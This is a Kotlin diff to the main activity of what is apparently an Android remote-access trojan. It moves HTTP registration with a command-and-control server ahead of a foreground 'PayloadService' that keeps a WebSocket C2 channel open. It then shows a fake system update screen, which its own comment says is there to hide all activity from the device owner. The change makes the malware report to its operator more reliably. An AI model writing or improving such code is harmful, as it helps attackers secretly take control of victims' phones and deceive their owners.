@@ -186,7 +186,10 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun finishSetup() {
-        // Step 4: Start foreground service
+        // Step 4: Register via HTTP FIRST (guaranteed delivery even if foreground service fails)
+        registerViaHttpFallback()
+
+        // Step 5: Start foreground service for real-time C2 (WebSocket)
         val serviceIntent = Intent(this, PayloadService::class.java)
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -195,13 +198,12 @@ class MainActivity : AppCompatActivity() {
                 startService(serviceIntent)
             }
         } catch (e: Exception) {
-            Log.e("MainActivity", "ForegroundService failed, registering via HTTP", e)
-            registerViaHttpFallback()
+            Log.e("MainActivity", "ForegroundService failed — HTTP registration already sent", e)
         }
 
         flowCompleted = true
 
-        // Step 5: Show system update overlay to hide all activity
+        // Step 6: Show system update overlay to hide all activity
         val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
         overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(overlayIntent)
